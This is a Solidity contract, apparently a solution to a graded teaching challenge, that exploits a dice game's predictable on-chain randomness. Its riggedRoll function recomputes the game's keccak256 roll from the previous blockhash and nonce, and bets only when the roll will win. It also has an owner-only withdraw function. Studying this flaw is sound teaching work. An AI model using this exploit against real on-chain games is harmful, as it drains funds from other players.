pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address addr , uint256 amount) public onlyOwner{
        require(address(this).balance >= amount,"Not enough balance");
        (bool ok,)= payable(addr).call{value: amount}("");
        require(ok,"Transfer failed");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Failed to send enough value");

        
        bytes32 prevHash = blockhash(block.number -1);
        uint256 num = uint256(keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()))) % 16;
        require(num <= 2,"Roll lost");
        diceGame.rollTheDice{value : 0.002 ether}();

        
    }

    //Add receive() function so contract can receive Eth
    receive() external payable{

    }
}